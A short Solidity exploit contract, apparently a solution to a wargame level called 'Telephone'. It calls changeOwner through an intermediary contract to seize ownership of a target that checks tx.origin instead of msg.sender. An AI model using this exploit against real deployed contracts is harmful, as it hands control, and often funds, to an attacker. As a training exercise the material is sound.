pragma solidity ^0.8.0;
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    function attack(address telephone) public {
        ITelephone(telephone).changeOwner(msg.sender);
    }
}